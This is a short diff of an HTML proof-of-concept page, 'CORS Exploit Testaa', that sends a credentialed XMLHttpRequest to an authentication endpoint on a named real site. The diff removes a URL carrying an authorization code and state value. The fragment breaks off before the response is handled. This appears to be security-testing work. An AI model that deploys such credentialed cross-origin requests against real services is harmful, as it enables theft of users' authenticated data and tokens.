@@ -4,7 +4,7 @@
 <h1>CORS Exploit Testaa (XMLHttpRequest)</h1>
 <script>
 var xhr = new XMLHttpRequest();
-xhr.open('GET', 'https://freizeit.sbb.ch/de/auth-loading?code=0egIvXkbRwKekGawFMv7V7mWLKm~vho13hbWNPaW0uXQeV9viC9SsOav0nhuem7OeuPW&state=9f40395bc2b9426a8de4e99fc9750b6a', true);
+xhr.open('GET', 'https://freizeit.sbb.ch/de/auth-loading', true);
 xhr.withCredentials = true;
 xhr.onreadystatechange = function() {
   if (xhr.readyState == 4) {
